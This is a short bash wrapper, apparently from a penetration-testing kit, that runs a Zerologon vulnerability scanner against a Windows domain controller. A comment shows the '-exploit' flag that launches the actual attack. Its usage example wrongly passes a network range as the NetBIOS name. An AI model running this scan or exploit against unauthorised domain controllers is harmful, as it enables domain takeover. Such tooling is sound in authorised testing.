#!/bin/bash
# Credits to: https://github.com/rth0pper/zerologon

if [ "$EUID" -ne 0 ]
  then echo "Please run as root"
  exit
fi

# python3 zerologon.py NETBIOS_NAME X.X.X.X
# Scans the target for the vulnerability
# python3 zerologon.py NETBIOS_NAME X.X.X.X -exploit

echo " "
echo "Syntax: zeroscan.sh 'DC netbios name' 'DC IP'" 
echo "Example: ./zeroscan.sh 192.168.123.1/24 10.10.10.20"
echo "Hint: DC netbios name and IP run xx and xx found in '1 nocreds/ '"
echo " "
python3 ./zerologon/zerologon.py "$1" "$2"
